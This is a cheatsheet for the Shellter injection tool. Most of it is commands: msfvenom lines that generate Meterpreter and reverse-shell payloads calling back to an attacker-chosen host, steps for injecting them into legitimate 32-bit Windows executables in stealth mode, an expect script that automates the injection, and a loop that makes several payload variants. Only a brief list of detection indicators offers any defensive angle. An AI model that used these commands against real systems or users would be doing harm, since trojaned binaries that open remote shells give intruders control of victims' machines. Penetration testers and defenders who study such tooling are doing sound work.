# Shellter Cheatsheet

## Quick Reference

### Installation

```bash
sudo apt update && sudo apt install shellter
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt install wine32
```

### Basic Workflow

```bash
# 1. Generate raw shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o /tmp/shellcode.bin

# 2. Launch Shellter (interactive)
shellter

# 3. Follow prompts:
#    [A] Attach to process → [N] for new PE
#    PE Target: /path/to/target.exe
#    [S]tealth mode
#    Payload Source: [L]ocal file
#    Shellcode file: /tmp/shellcode.bin
#    Select injection point
```

### MSFvenom → Shellter Pipeline

```bash
# Generate shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o /tmp/shell.bin

# Inject (interactive)
shellter
```

### Shellter Modes

| Mode | Flag | Description |
|------|------|-------------|
| Stealth | `S` | Deep analysis, optimal injection points |
| Performance | `P` | Faster, less thorough |

### Key Concepts

- **Target**: 32-bit Windows PE files only
- **Shellcode**: Raw format from MSFvenom
- **Injection**: Uses existing code caves (no new sections)
- **Backup**: Original PE saved as `.bak`
- **Wine**: Required on Linux for PE processing

### Automated Injection (expect)

```bash
expect << EOF
spawn shellter
expect "Select:" { send "N\r" }
expect "PE Target:" { send "/path/to/target.exe\r" }
expect "Select:" { send "S\r" }
expect "Select:" { send "L\r" }
expect "Shellcode file:" { send "/tmp/shellcode.bin\r" }
expect eof
EOF
```

### Generate Multiple Shellcode Variants

```bash
for port in 4444 4445 4446; do
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=$port -f raw -o /tmp/shell_${port}.bin
done
```

### Troubleshooting

```bash
# Wine not found
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32

# Verify target is 32-bit
file target.exe
# Must show: PE32 executable

# If injection fails, try a different target binary
```

### Detection Indicators

- Applications making unexpected network connections
- Parent-child process anomalies
- RWX memory in non-standard locations
- Process crashes after injection

### Useful Alternatives

| Tool | Use Case |
|------|----------|
| BDF (Backdoor Factory) | ELF/Mach-O infection |
| Cymothoa | Linux process injection |
| MSFvenom | Raw shellcode generation |
